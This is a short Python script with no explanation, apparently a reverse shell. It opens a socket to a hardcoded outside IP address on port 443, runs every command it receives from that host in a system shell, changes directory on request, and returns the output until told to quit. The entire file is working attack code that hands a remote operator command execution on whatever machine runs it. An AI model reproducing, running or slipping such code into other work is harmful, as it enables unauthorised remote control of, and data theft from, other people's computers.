
        



import socket 
import subprocess 
import os


port = 443
host = '18.198.4.215'

s = socket.socket()
s.connect((host,port))

while True:
	get_resp = s.recv(4096)

	if get_resp.decode("UTF-8") == "quit":
		break

	if get_resp[:2].decode("UTF-8") == "cd":
		os.chdir(get_resp[3:].decode("utf-8"))

	p = subprocess.Popen(get_resp.decode("UTF-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

	s.send(p.stdout.read())

	retval = p.wait()

s.close()
